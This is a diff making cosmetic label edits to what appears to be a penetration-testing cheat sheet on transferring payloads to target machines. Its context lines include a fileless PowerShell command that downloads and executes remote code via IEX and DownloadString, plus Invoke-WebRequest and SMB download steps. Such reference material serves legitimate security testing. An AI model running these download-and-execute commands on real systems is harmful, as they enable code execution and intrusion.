@@ -28,7 +28,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   <details>
     <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
 
-  Base  
+  Defaulr  
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
   ```
@@ -42,7 +42,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   <details>
     <summary><strong>PowerShell Invoke-WebRequest</strong></summary>
 
-  Base  
+  Default  
   ```powershell
   Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
   ```
@@ -63,7 +63,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   <details>
     <summary><strong>SMB Downloads</strong></summary>
 
-  **Base form**
+  **Default**
   
   Create the SMB Server in Linux
   ```bash
